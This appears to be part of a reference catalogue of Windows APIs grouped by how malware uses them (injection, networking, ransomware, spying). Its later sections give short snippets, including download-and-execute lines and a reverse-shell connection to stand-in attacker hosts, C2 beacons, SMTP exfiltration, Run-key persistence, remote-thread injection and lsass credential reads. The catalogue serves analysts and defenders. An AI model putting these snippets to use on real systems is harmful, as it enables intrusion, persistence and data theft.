**Categories:** Injection, windows_api

#### MapViewOfFile2
MapViewOfFile2 is used for heap allocation and manipulation.
**Categories:** Injection, windows_api

#### MapViewOfFile3
MapViewOfFile3 is used for heap allocation and manipulation.
**Categories:** Injection, windows_api

#### MapViewOfFileEx
MapViewOfFileEx is used for heap allocation and manipulation.
**Categories:** Injection, windows_api

#### NtAdjustPrivilegesToken
NtAdjustPrivilegesToken is used to modify state of avaiable token's privileges. This function is often used by malwar...
**Categories:** Injection, windows_api

#### NtAllocateVirtualMemory
NtAllocateVirtualMemoy is used to reserve, commit, or both, a region of pages within the user-mode virtual address sp...
**Categories:** Injection, windows_api

#### NtContinue
NtContinue is used to resume the execution of a thread.
**Categories:** Injection, windows_api

#### NtCreateProcess
NtCreateProcess is used to create a new process.
**Categories:** Injection, windows_api

#### NtCreateProcessEx
NtCreateProcessEx is used to create a new process.
**Categories:** Injection, windows_api

#### NtCreateSection
NtCreateSection is used to create a new section object.
**Categories:** Injection, windows_api

#### NtCreateThread
NtCreateThread is used to create a new thread.
**Categories:** Injection, windows_api

#### NtCreateThreadEx
NtCreateThreadEx is used to create a new thread.
**Categories:** Injection, windows_api

#### NtCreateUserProcess
NtCreateUserProcess is used to create a new process.
**Categories:** Injection, windows_api

#### NtDuplicateObject
NtDuplicateObject is used to create a handle that is a duplicate of the specified source handle. Malware can use this...
**Categories:** Injection, windows_api

#### NtMapViewOfSection
NtMapViewOfSection is used to map a view of a section into the virtual address space of a subject process. This funct...
**Categories:** Injection, windows_api

#### NtOpenProcess
NtOpenProcess is used to get a handle on a process. This function is commonly used as part of process injection.
**Categories:** Injection, windows_api

#### NtOpenThread
NtOpenThread is used to get a handle on a thread. This function is commonly used as part of process injection.
**Categories:** Injection, windows_api

#### NtProtectVirtualMemory
NtProtectVirtualMemory is used to interact with and modify memory regions.
**Categories:** Injection, windows_api

#### NtQueueApcThread
NtQueueApcThread is used to execute code for a different thread. This function is commonly used as part of process in...
**Categories:** Injection, windows_api

#### NtQueueApcThreadEx
NtQueueApcThreadEx is used to execute code for a different thread. This function is commonly used as part of process...
**Categories:** Injection, windows_api

#### NtQueueApcThreadEx2
NtQueueApcThreadEx2 is a new system call that allows to pass both UserApcFlags and MemoryReserveHandle.
**Categories:** Injection, windows_api

#### NtReadVirtualMemory
NtReadVirtualMemory is used to copy data in the specified address range from the address space of the specified proce...
**Categories:** Injection, windows_api

#### NtReadVirtualMemoryEx
NtReadVirtualMemoryEx is used to copy data in the specified address range from the address space of the specified pro...
**Categories:** Injection, windows_api

#### NtResumeProcess
NtResumeProcess is used to resume a suspended process
**Categories:** Injection, Helper, windows_api

#### NtResumeThread
NtResumeThread is used to resume a suspended thread.
**Categories:** Injection, windows_api

#### NtSuspendProcess
NtSuspendProcess is used to suspend the target process
**Categories:** Injection, windows_api

#### NtUnmapViewOfSection
NtUnmapViewOfSection is used to unmap a view of a section from the virtual address space of a subject process.
**Categories:** Injection, windows_api

#### NtWaitForMultipleObjects
NtWaitForMultipleObjects is used to wait until one or all of the specified objects are in the signaled state or the t...
**Categories:** Injection, Evasion, windows_api

#### NtWaitForSingleObject
NtWaitForSingleObject is used to wait until the specified object is in the signaled state or the time-out interval el...
**Categories:** Injection, Evasion, windows_api

#### NtWriteVirtualMemory
NtWriteVirtualMemory is used to copy the specified address range from the current process into the specified address...
**Categories:** Injection, windows_api

#### OpenFileMappingA
OpenFileMappingA is used to open a named file mapping object.
**Categories:** Injection, windows_api

#### OpenProcess
OpenProcess is used to get a handle on a process. This function is commonly used by malware during process injection.
**Categories:** Injection, windows_api

#### OpenProcessToken
OpenProcessToken is used to open the access token associated with a process.
**Categories:** Injection, windows_api

#### OpenThread
OpenThread is used to get a handle on a specified thread. It is commonly seen in process injection techniques.
**Categories:** Injection, windows_api

#### QueueUserAPC
QueueUserAPC is used to execute code for a different thread. This function is commonly used as part of process inject...
**Categories:** Injection, windows_api

#### ResumeThread
ResumeThread is used to resume a specified thread often times as part of process injection.
**Categories:** Injection, windows_api

#### RtlCopyMemory
RtlCopyMemory is used to copy the contents of a source memory block to a destination memory block.
**Categories:** Injection, windows_api

#### RtlCreateHeap
RtlCreateHeap is used to create a heap object that can be used by the calling process.
**Categories:** Injection, windows_api

#### RtlMoveMemory
RtlMoveMemory is used to copy the contents of a source memory block to a destination memory block, and supports overl...
**Categories:** Injection, windows_api

#### SetProcessDEPPolicy
SetProcessDEPPolicy is used to override the default DEP policy. Malware will use this function to allow data execution.
**Categories:** Injection, windows_api

#### SetPropA
SetPropA is used to add a new entry or changes an existing entry in the property list of the specified window. This f...
**Categories:** Injection, windows_api

#### SetThreadContext
SetThreadContext is used to modify a thread's context. This is often used as part of process injection techniques.
**Categories:** Injection, windows_api

#### SuspendThread
SuspendThread is used to suspend a specified thread often times as part of process injection or to tamper with a legi...
**Categories:** Injection, windows_api

#### Toolhelp32ReadProcessMemory
Toolhelp32ReadProcessMemory can be used to read the memory of other processes.
**Categories:** Injection, Enumeration, windows_api

#### UuidFromStringA
UuidFromStringA is used to convert a string to a UUID. This function can be abused to both decode data and write it t...
**Categories:** Injection, Evasion, Helper, windows_api

#### VirtualAlloc
VirtualAlloc is often used by malware to allocate memory as part of process injection.
**Categories:** Injection, windows_api

#### VirtualAlloc2
VirtualAlloc2 is used to reserve or changes the state of a region of pages in the virtual address space of a specifie...
**Categories:** Injection, windows_api

#### VirtualAlloc2FromApp
VirtualAlloc2FromApp is used to reserve or changes the state of a region of pages in the virtual address space of the...
**Categories:** Injection, windows_api

#### VirtualAllocEx
VirtualAllocEx is often used by malware to allocate memory in a remote process as part of process injection.
**Categories:** Injection, windows_api

#### VirtualAllocExNuma
VirtualAllocExNuma is used to reserve or changes the state of a region of pages in the virtual address space of a spe...
**Categories:** Injection, windows_api

#### VirtualAllocFromApp
VirtualAllocFromApp is used to reserve or changes the state of a region of pages in the virtual address space of the...
**Categories:** Injection, windows_api

#### VirtualProtect
VirtualProtect is often used by malware to modify memory protection (often to allow write or execution).
**Categories:** Injection, windows_api

#### VirtualProtectEx
VirtualProtectEx is often used by malware to modify memory protection in a remote process (often to allow write or ex...
**Categories:** Injection, windows_api

#### VirtualProtectFromApp
VirtualProtectFromApp is used to change the protection on a region of committed pages in the virtual address space of...
**Categories:** Injection, windows_api

#### WaitForMultipleObjects
WaitForMultipleObjects is used to wait until one or all of the specified objects are in the signaled state or the tim...
**Categories:** Injection, Evasion, windows_api

#### WaitForMultipleObjectsEx
WaitForMultipleObjectsEx is used to wait until one or all of the specified objects are in the signaled state or the t...
**Categories:** Injection, Evasion, windows_api

#### WaitForSingleObject
WaitForSingleObject is used to delay the execution of an object. This function is commonly used to allow time for she...
**Categories:** Injection, Evasion, windows_api

#### WaitForSingleObjectEx
WaitForSingleObjectEx is used to delay the execution of an object. This function is commonly used to allow time for s...
**Categories:** Injection, Evasion, windows_api

#### Wow64SetThreadContext
Wow64SetThreadContext is used to set the context for the specified thread. This function can be used by malware as pa...
**Categories:** Injection, windows_api

#### WriteProcessMemory
Writing data into a specified region of memory. This function is often used by malware as part of process injection t...
**Categories:** Injection, windows_api

### Internet

#### Accept
Accept is used to permit an incoming connection attempt on a socket.
**Categories:** Internet, windows_api

#### Bind
Bind is used to associates a local address with a socket.
**Categories:** Internet, windows_api

#### Closesocket
Closesocket is used to close an existing socket.
**Categories:** Internet, windows_api

#### Connect
Connect is used to establish a connection to a specified socket.
**Categories:** Internet, windows_api

#### DnsQuery_A
DnsQuery_A is used to send a DNS query. This may be used for communications over a DNS tunnel.
**Categories:** Internet, windows_api

#### DnsQueryEx
DnsQueryEx is used to send a DNS query. This may be used for communications over a DNS tunnel.
**Categories:** Internet, windows_api

#### FtpPutFileA
FtpPutFileA is used to upload a file to a server via FTP.
**Categories:** Internet, windows_api

#### Gethostbyname
gethostbyname is used to retrieve host information corresponding to a host name from a host database.
**Categories:** Internet, windows_api

#### Gethostname
gethostname is used to retrieve the standard host name for the local computer.
**Categories:** Internet, windows_api

#### HttpAddRequestHeaders
HttpAddRequestHeaders adds HTTP request headers to forge custom request handle
**Categories:** Internet, windows_api

#### HttpOpenRequestA
HttpOpenRequestA is used to create a HTTP request.
**Categories:** Internet, windows_api

#### HttpSendRequestA
HttpSendRequestA is used to send a HTTP request to a server.
**Categories:** Internet, windows_api

#### HttpSendRequestExA
HttpSendRequestExA is used to send a HTTP request to a server
**Categories:** Internet, windows_api

#### Inet_addr
inet_addr is used to convert a string containing an IPv4 dotted-decimal address into a proper address for the IN_ADDR...
**Categories:** Internet, windows_api

#### InternetCloseHandle
InternetCloseHandle is used to close an internet handle.
**Categories:** Internet, windows_api

#### InternetConnectA
InternetConnectA is used to open a File Transfer Protocol (FTP) or HTTP session for a given site.
**Categories:** Internet, windows_api

#### InternetOpenA
InternetOpenA is used to initialize the use of WinINet functions.
**Categories:** Internet, windows_api

#### InternetOpenUrlA
InternetOpenUrlA is used to open a resource specified by a complete FTP or HTTP URL.
**Categories:** Internet, windows_api

#### InternetReadFile
InternetReadFile is used to read data from a handle opened by the InternetOpenUrl, FtpOpenFile, or HttpOpenRequest fu...
**Categories:** Internet, windows_api

#### InternetReadFileExA
InternetReadFileExA is used to read data from a handle opened by the InternetOpenUrl or HttpOpenRequest function.
**Categories:** Internet, windows_api

#### InternetSetOptionA
InternetSetOptionA is used to set an Internet option.
**Categories:** Internet, windows_api

#### InternetWriteFile
InternetWriteFile is used to write data to an open Internet file.
**Categories:** Internet, windows_api

#### ioctlsocket
ioctlsocket takes control of the I/O mode of a socket in any state
**Categories:** Internet, windows_api

#### Listen
Listen is used to place a socket in a state in which it is listening for an incoming connection.
**Categories:** Internet, windows_api

#### Recv
Recv is used to receive data from a connected socket or a bound connectionless socket.
**Categories:** Internet, windows_api

#### Send
Send is used to send data on a connected socket.
**Categories:** Internet, windows_api

#### ShellExecuteA
ShellExecuteA is used to perform an operation on a specified file.
**Categories:** Internet, windows_api

#### ShellExecuteExA
ShellExecuteExA is used to perform an operation on a specified file.
**Categories:** Internet, windows_api

#### Socket
socket is used create a socket that is bound to a specific transport service provider.
**Categories:** Internet, windows_api

#### URLDownloadToCacheFile
URLDownloadToCacheFile is used to download data to the Internet cache and returns the file name of the cache location...
**Categories:** Internet, windows_api

#### URLDownloadToFile
URLDownloadToFile is used to download bits from the Internet and saves them to a file.
**Categories:** Internet, windows_api

#### URLOpenBlockingStream
URLOpenBlockingStream is used to create a blocking type stream object from a URL and downloads the data from the Inte...
**Categories:** Internet, windows_api

#### URLOpenStream
URLOpenStream is used to create a push type stream object from a URL.
**Categories:** Internet, windows_api

#### WinExec
WinExec is used to allow the execution of an application.
**Categories:** Internet, windows_api

#### WNetOpenEnumA
The WNetOpenEnumA function starts an enumeration of network resources or existing connections. You can continue the e...
**Categories:** Internet, Helper, windows_api

#### WSACleanup
WSACleanup is used to terminate the use of the Winsock 2 DLL. This function is commonly used by malware upon successf...
**Categories:** Internet, windows_api

#### WSAIoctl
WSAIoctl Can be used to retrieve and set socket mode. E.g.: Put NIC in 'Promiscuous Mode'
**Categories:** Internet, windows_api

#### WSASocketA
WSASocketA is used to create a socket that is bound to a specific transport-service provider.
**Categories:** Internet, windows_api

#### WSAStartup
WSAStartup is used to initiate use of the Winsock DLL by a process.
**Categories:** Internet, windows_api

### Ransomware

#### CryptAcquireContextA
CryptAcquireContextA is used to acquire a handle to a particular key container within a particular cryptographic serv...
**Categories:** Ransomware, windows_api

#### CryptBinaryToString
The CryptBinaryToString function is used to convert an array of bytes into a formatted string.
**Categories:** Ransomware, windows_api

#### CryptCreateHash
CryptCreateHash is used to create a hash.
**Categories:** Ransomware, windows_api

#### CryptDecrypt
CryptDecrypt is used to decrypt data.
**Categories:** Ransomware, windows_api

#### CryptDeriveKey
CryptDeriveKey is used to create encryption keys.
**Categories:** Ransomware, windows_api

#### CryptDestroyHash
The CryptDestroyHash function destroys the hash object referenced by the hHash parameter. After a hash object has bee...
**Categories:** Ransomware, windows_api

#### CryptDestroyKey
CryptDestroyKey is used to destroy previously generated encryption keys.
**Categories:** Ransomware, windows_api

#### CryptEncrypt
CryptEncrypt is used to encrypt data.
**Categories:** Ransomware, windows_api

#### CryptGenRandom
CryptGenRandom is used to fill a buffer with cryptographically random bytes.
**Categories:** Ransomware, windows_api

#### CryptGetHashParam
CryptGetHashParam
**Categories:** Ransomware, windows_api

#### CryptHashData
CryptHashData is used to create a hash.
**Categories:** Ransomware, windows_api

#### CryptReleaseContext
The CryptReleaseContext function is used to release the handle of a cryptographic service provider (CSP) and a key co...
**Categories:** Ransomware, windows_api

#### CryptSetKeyParam
CryptSetKeyParam is used to customize various aspects of a session key's operations.
**Categories:** Ransomware, Ransomware, windows_api

#### CryptStringToBinary
The CryptStringToBinary function is used to convert a formatted string into an array of bytes.
**Categories:** Ransomware, windows_api

#### DecryptFileA
DecryptFileA is used to decrypt an encrypted file or directory.
**Categories:** Ransomware, windows_api

#### EncryptFileA
EncryptFileA is used to encrypt a file or directory.
**Categories:** Ransomware, windows_api

#### FlushEfsCache
FlushEfsCache is used to flush EFS data from memory. This is used by EFS ransomware post-encryption to cause the file...
**Categories:** Ransomware, windows_api

### script-engine

#### PowerShell - Reflection Abuse
API: System.Reflection; Use .NET reflection to execute code bypassing PowerShell restrictions
**Categories:** script-engine, code-execution, windows_api
```
[Reflection.Assembly]::LoadWithPartialName('System.Reflection'); $a = New-Object System.Reflection.Assembly
```

#### Python - os.system/subprocess
API: os, subprocess; Execute system commands via Python on Windows
**Categories:** script-engine, process-execution, windows_api
```
python.exe -c "import subprocess; subprocess.call('whoami', shell=True)"
```

#### VBScript - Execute Method
API: VBScript; Execute VBScript from command line
**Categories:** script-engine, code-execution, windows_api
```
cscript.exe /nologo script.vbs
```

### script-engine-api

#### PowerShell - Reflection and .NET Abuse
API: PowerShell.exe; Load .NET assemblies and invoke methods without writing to disk
**Categories:** script-engine-api, code-execution, windows_api
```
[Reflection.Assembly]::LoadWithPartialName("System.Net"); $wc = New-Object Net.WebClient; iex $wc.DownloadString('http://attacker.com/payload')
```

### Spying

#### AttachThreadInput
AttachThreadInput is used to attach the input processing from one thread to another so that the second thread receive...
**Categories:** Spying, windows_api

#### BitBlt
BitBlt is used to copy graphic data from one device to another. Spyware sometimes uses this function to capture scree...
**Categories:** Spying, windows_api

#### CallNextHookEx
CallNextHookEx is used within code that is hooking an event set by SetWindowsHookEx. CallNextHookEx calls the next ho...
**Categories:** Spying, windows_api

#### GetAsyncKeyState
GetAsyncKeyState is used to determine when a specific key is pressed. This function is commonly used by keyloggers.
**Categories:** Spying, windows_api

#### GetClipboardData
GetClipboardData is used to retrieve copied data residing in the clipboard.
**Categories:** Spying, windows_api

#### GetDC
GetDC is used to retrieve a handle to a device context (DC) for the client area of a specified window or for the enti...
**Categories:** Spying, windows_api

#### GetDCEx
GetDCEx is used to retrieve a handle to a device context (DC) for the client area of a specified window or for the en...
**Categories:** Spying, windows_api

#### GetForegroundWindow
GetForegroundWindow is used to get a handle to the foreground window (the window with which the user is currently wor...
**Categories:** Spying, Anti-Debugging, windows_api

#### GetKeyboardState
GetKeyboardState is used to copy the status of the 256 virtual keys to the specified buffer. This function is commonl...
**Categories:** Spying, windows_api

#### GetKeynameTextA
The GetKeynameTextA function is used to retrieve a string that represents the name of a key.
**Categories:** Spying, windows_api

#### GetKeyState
GetKeyState is used to retrieve the status of the specified virtual key. This function is commonly used by keyloggers.
**Categories:** Spying, windows_api

#### GetMessageA
GetMessageA is used to retrieve a message from the calling thread's message queue. This function is commonly used by...
**Categories:** Spying, windows_api

#### GetRawInputData
GetRawInputData is used to retrieve the raw input data from a specified device. This function is commonly used by key...
**Categories:** Spying, windows_api

#### GetWindowDC
GetWindowDC is used to retrieve the device context (DC) for the entire window, including title bar, menus, and scroll...
**Categories:** Spying, windows_api

#### MapVirtualKeyA
MapVirtualKeyA is used to map a virtual-key code into a scan code or character value, or translates a scan code into...
**Categories:** Spying, windows_api

#### MapVirtualKeyExA
MapVirtualKeyExA is used to map a virtual-key code into a scan code or character value, or translates a scan code int...
**Categories:** Spying, windows_api

#### PeekMessageA
PeekMessageA is used to check for incoming sent messages, checks the thread message queue for a posted message, and r...
**Categories:** Spying, windows_api

#### PostMessageA
PostMessageA is used to post a message in the message queue associated with the thread that created the specified win...
**Categories:** Spying, windows_api

#### PostThreadMessageA
PostThreadMessageA is used to post a message to the message queue of the specified thread.
**Categories:** Spying, windows_api

#### RegisterRawInputDevices
RegisterRawInputDevices is used to register the devices that supply raw input.
**Categories:** Spying, windows_api

#### SendMessageA
SendMessageA is used to send the specified message to a window or windows.
**Categories:** Spying, windows_api

#### SendMessageCallbackA
SendMessageCallbackA is used to send the specified message to a window or windows.
**Categories:** Spying, windows_api

#### SendMessageTimeoutA
SendMessageTimeoutA is used to send the specified message to a window or windows.
**Categories:** Spying, windows_api

#### SendNotifyMessageA
SendNotifyMessageA is used to send the specified message to a window or windows.
**Categories:** Spying, windows_api

#### SetWindowsHookExA
SetWindowsHookExA is used to install an application-defined hook procedure into a hook chain. This function is common...
**Categories:** Spying, windows_api

#### SetWinEventHook
SetWinEventHook is used to set an event hook function for a range of events.
**Categories:** Spying, windows_api

#### StretchBlt
StretchBlt is used to copy graphic data from one device to another. Spyware sometimes uses this function to capture s...
**Categories:** Spying, windows_api

#### UnhookWindowsHookEx
UnhookWindowsHookEx is used to remove a hook procedure installed in a hook chain by the SetWindowsHookEx function.
**Categories:** Spying, windows_api

### windows-api

#### advapi32.dll - RegOpenKeyEx
API: advapi32.dll; Class: RegOpenKeyEx; Access registry keys for persistence or data theft
**Categories:** windows-api, registry-access, windows_api
```
RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\Run", 0, KEY_WRITE, &hKey);
```

#### kernel32.dll - VirtualAllocEx + WriteProcessMemory
API: kernel32.dll; Class: VirtualAllocEx, WriteProcessMemory; Allocate memory in remote process and write shellcode
**Categories:** windows-api, process-injection, windows_api
```
VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, addr, shellcode, size, NULL);
```

#### ntdll.dll - NtCreateFile
API: ntdll.dll; Class: NtCreateFile; Use low-level API to bypass file access restrictions
**Categories:** windows-api, file-operations, windows_api
```
NtCreateFile(&fileHandle, SYNCHRONIZE, &objAttr, &ioStatus, NULL, 0, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_ALERT, NULL, 0);
```

### windows-com

#### ADSI - DirectoryEntry Authentication
API: System.DirectoryServices; Class: DirectoryEntry; Validate credentials without network traffic
**Categories:** windows-com, authentication, windows_api
```
var de = new DirectoryEntry(path, username, password); de.RefreshCache(new[]{"objectClass"}); // valid/invalid based on exception
```

#### Excel.Application COM Object
API: Microsoft.Office.Interop.Excel; Class: Application; Create malicious Excel macro for code execution
**Categories:** windows-com, persistence, windows_api
```
var excel = new Excel.Application(); excel.Workbooks.Open(...); excel.Run("macro");
```

#### MSXML.XMLHTTP COM Object
API: MSXML; Class: XMLHTTP3; Establish HTTP communication via COM instead of managed APIs
**Categories:** windows-com, network-communication, windows_api
```
var xml = new MSXML2.XMLHTTP(); xml.open("POST", "http://c2/beacon", false); xml.send(beacon_data);
```

#### WMI - Win32_Process.Create
API: WbemScripting; Class: SWbemServices; Execute arbitrary commands via WMI
**Categories:** windows-com, process-execution, windows_api
```
Get-WmiObject Win32_Process -ComputerName target -Credential $cred | Invoke-WmiMethod -Name Create -ArgumentList "cmd.exe"
```

#### WMI - Win32_Service.Create
API: WbemScripting; Class: SWbemServices; Create Windows service for persistence
**Categories:** windows-com, persistence, windows_api
```
Get-WmiObject Win32_Service -Filter "Name='NewService'" | Invoke-WmiMethod -Name Create -ArgumentList "NewService","C:\\malware.exe"
```

#### Word.Application COM Object
API: Microsoft.Office.Interop.Word; Class: Application; Exploit Word macros for code execution
**Categories:** windows-com, persistence, windows_api
```
var word = new Word.Application(); word.Documents.Open("malicious.docm"); word.Run("AutoOpen");
```

### windows-com-api

#### access.Application COM Object
API: Access.Application; Create and execute Access macros for code execution
**Categories:** windows-com-api, code-execution, windows_api
```
Set app = CreateObject("Access.Application"); app.OpenCurrentDatabase "C:\\malicious.mdb"; app.Run "malicious_macro"
```

#### MSXML.XMLHTTP.6.0 COM Object
API: MSXML.XMLHTTP; Fetch remote payloads without certutil or powershell
**Categories:** windows-com-api, network-communication, windows_api
```
Set xmlHttp = CreateObject("MSXML2.XMLHTTP") xmlHttp.Open "GET", "http://attacker.com/malware.exe" xmlHttp.Send
```

#### outlook.Application COM Object
API: Outlook.Application; Read emails from Outlook and exfiltrate data
**Categories:** windows-com-api, data-exfiltration, windows_api
```
Set outlook = CreateObject("Outlook.Application") Set folder = outlook.GetNamespace("MAPI").GetDefaultFolder(6) For Each mail In folder.Items ... Send(mail) ... Next
```

#### Scripting.FileSystemObject COM Object
API: Scripting.FileSystemObject; Download and write malware files to disk
**Categories:** windows-com-api, file-operations, windows_api
```
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile "\\\\attacker\\\\malware.exe", "C:\\malware.exe", True
```

#### Shell.Application COM Object
API: Shell.Application; Execute commands via Shell.Application.ShellExecute
**Categories:** windows-com-api, shell-execution, windows_api
```
Set shell = CreateObject("Shell.Application")
shell.ShellExecute "cmd.exe", "/c malware.exe", "", "open", 1
```

#### WMI - Win32_DCOMApplication
API: WMI; Class: Win32_DCOMApplication; Execute commands on remote systems via DCOM
**Categories:** windows-com-api, lateral-movement, windows_api
```
Get-WmiObject -Class Win32_DCOMApplication | Where-Object { $_.Name -match 'Excel' } | Invoke-WmiMethod
```

#### WScript.Shell COM Object
API: WScript.Shell; Execute system commands via WScript.Shell.Exec; Modify registry for persistence
**Categories:** windows-com-api, script-execution, windows_api
```
Set shell = CreateObject("WScript.Shell")
shell.Exec "cmd.exe /c whoami"
```

### windows-dotnet-api

#### Microsoft.Win32.Registry.CreateSubKey
API: Microsoft.Win32; Class: Registry; Create malware entries in Run keys for persistence
**Categories:** windows-dotnet-api, registry-manipulation, windows_api
```
RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\\Microsoft\\Windows\\CurrentVersion\\Run"); key.SetValue("Malware", "C:\\malware.exe");
```

#### Microsoft.Win32.Registry.SetValue
API: Microsoft.Win32; Class: Registry; Persist malware via RunOnce or Run keys
**Categories:** windows-dotnet-api, persistence, windows_api
```
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Malware", "C:\\malware.exe");
```

#### System.ComponentModel.TypeConverter
API: System.ComponentModel; Class: TypeConverter; Abuse type conversion for RCE via deserialization
**Categories:** windows-dotnet-api, code-execution, windows_api
```
var converter = TypeDescriptor.GetConverter(typeof(InstanceDescriptor)); var obj = converter.ConvertFromString(gadgetPayload);
```

#### System.Diagnostics.EventLog.WriteEntry
API: System.Diagnostics; Class: EventLog; Write fake entries to event log to cover malicious activity
**Categories:** windows-dotnet-api, log-manipulation, windows_api
```
EventLog.WriteEntry("Application", "Normal-looking event that masks actual activity");
```

#### System.Diagnostics.Process.Start
API: System.Diagnostics; Class: Process; Execute arbitrary commands without a parent shell
**Categories:** windows-dotnet-api, process-execution, windows_api
```
Process.Start("cmd.exe", "/c powershell.exe -nop -w hidden -c ...");
```

#### System.Diagnostics.ProcessStartInfo
API: System.Diagnostics; Class: ProcessStartInfo; Execute hidden processes without window display
**Categories:** windows-dotnet-api, process-execution, windows_api
```
var psi = new ProcessStartInfo("cmd.exe", "/c whoami"); psi.WindowStyle = ProcessWindowStyle.Hidden; Process.Start(psi);
```

#### System.IO.File.WriteAllBytes
API: System.IO; Class: File; Write payload to disk for execution
**Categories:** windows-dotnet-api, file-operations, windows_api
```
File.WriteAllBytes("C:\\temp\\payload.exe", payloadBytes);
```

#### System.IO.Pipes.NamedPipeClientStream
API: System.IO.Pipes; Class: NamedPipeClientStream; Connect to named pipes to communicate with other processes/machines
**Categories:** windows-dotnet-api, inter-process-communication, windows_api
```
NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", "malware_pipe");
pipeClient.Connect();
StreamWriter writer = new StreamWriter(pipeClient);
writer.WriteLine(command);
```

#### System.Net.Http.HttpClient
API: System.Net.Http; Class: HttpClient; Establish HTTP(S) command and control channel
**Categories:** windows-dotnet-api, network-communication, windows_api
```
var client = new HttpClient(); var response = await client.GetAsync("http://c2-server/cmd");
```

#### System.Net.HttpWebRequest.GetResponse
API: System.Net; Class: HttpWebRequest; Establish persistent C2 channel over HTTP
**Categories:** windows-dotnet-api, network-communication, windows_api
```
HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://c2.attacker.com/beacon"); req.Method = "POST"; var resp = req.GetResponse();
```

#### System.Net.Mail.SmtpClient
API: System.Net.Mail; Class: SmtpClient; Use SMTP to send stolen data via email
**Categories:** windows-dotnet-api, command-and-control, windows_api
```
SmtpClient client = new SmtpClient("mail.server.com");
MailMessage msg = new MailMessage("attacker@domain.com", "attacker@domain.com");
msg.Body = exfiltrated_data;
client.Send(msg);
```

#### System.Net.ServicePointManager.ServerCertificateValidationCallback
API: System.Net; Class: ServicePointManager; Disable SSL/TLS certificate validation for MITM
**Categories:** windows-dotnet-api, evasion, windows_api
```
ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, ssl) => true;
```

#### System.Net.Sockets.TcpClient
API: System.Net.Sockets; Class: TcpClient; Establish raw TCP connection for reverse shell
**Categories:** windows-dotnet-api, network-communication, windows_api
```
var tcp = new TcpClient("attacker.com", 4444); var stream = tcp.GetStream(); /* execute commands over stream */
```

#### System.Net.WebClient
API: System.Net; Class: WebClient; Download and execute remote payloads
**Categories:** windows-dotnet-api, network-communication, windows_api
```
var wc = new WebClient(); var payload = wc.DownloadData("http://attacker.com/payload.exe"); File.WriteAllBytes("C:\\payload.exe", payload);
```

#### System.Net.WebClient.DownloadString
API: System.Net; Class: WebClient; Fetch PowerShell code from remote server and execute
**Categories:** windows-dotnet-api, resource-retrieval, windows_api
```
WebClient wc = new WebClient(); string code = wc.DownloadString("http://attacker.com/payload.ps1"); System.Diagnostics.Process.Start("powershell.exe", code);
```

#### System.Reflection.Assembly.Load
API: System.Reflection; Class: Assembly; Load and execute .NET assembly from memory without touching disk
**Categories:** windows-dotnet-api, code-execution, windows_api
```
var asm = Assembly.Load(assemblyBytes); asm.GetType("Namespace.Class").GetMethod("Method").Invoke(null, null);
```

#### System.Reflection.Emit.DynamicMethod
API: System.Reflection.Emit; Class: DynamicMethod; Generate IL bytecode at runtime to evade static analysis
**Categories:** windows-dotnet-api, code-execution, windows_api
```
var dm = new DynamicMethod("Invoke", null, null); dm.GetILGenerator().Emit(...);
```

#### System.Reflection.MethodInfo.Invoke
API: System.Reflection; Class: MethodInfo; Use reflection to invoke methods without direct references
**Categories:** windows-dotnet-api, code-execution, windows_api
```
var method = typeof(Process).GetMethod("Start", new[] { typeof(string) });
method.Invoke(null, new[] { "cmd.exe" });
```

#### System.Runtime.InteropServices.Marshal
API: System.Runtime.InteropServices; Class: Marshal; Execute native code from managed .NET
**Categories:** windows-dotnet-api, code-execution, windows_api
```
var funcPtr = Marshal.GetFunctionPointerForDelegate(new Func<int>(NativeMethod)); var func = Marshal.GetDelegateForFunctionPointer<Func<int>>(funcPtr);
```

### windows-native-api

#### advapi32.dll - RegSetValueEx
API: advapi32.dll; Write to Run/RunOnce registry keys to achieve persistence; Modify Windows Defender or firewall set...
**Categories:** windows-native-api, registry-manipulation, windows_api
```
RegSetValueEx(hKey, "Malware", 0, REG_SZ, (LPBYTE)"C:\\malware.exe", strlen("C:\\malware.exe")+1);
```

#### kernel32.dll - CreateRemoteThread
API: kernel32.dll; Execute shellcode in remote process by creating a thread in another process
**Categories:** windows-native-api, process-injection, windows_api
```
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
```

#### kernel32.dll - GetProcAddress
API: kernel32.dll; Resolve API addresses at runtime to avoid static detection
**Categories:** windows-native-api, api-resolution, windows_api
```
typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPVOID, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
pCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateRemoteThread");
```

#### kernel32.dll - LoadLibraryA/W
API: kernel32.dll; Load attacker-controlled DLL from writeable path before legitimate module; Load custom DLL for in-...
**Categories:** windows-native-api, module-loading, windows_api
```
HMODULE hMod = LoadLibraryA("kernel32.dll"); // Loads from %PATH% - can be hijacked
```

#### kernel32.dll - OpenProcess + ReadProcessMemory
API: kernel32.dll; Read memory of lsass.exe to extract cached credentials
**Categories:** windows-native-api, memory-access, windows_api
```
HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, lsassPID);
ReadProcessMemory(hProcess, address, buffer, size, NULL);
```

#### user32.dll - SetWindowsHookEx
API: user32.dll; Install WH_KEYBOARD_LL or WH_MOUSE_LL hook to capture user input; Install WH_GETMESSAGE hook to inje...
**Categories:** windows-native-api, hooking, windows_api
```
HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hModule, 0);
```
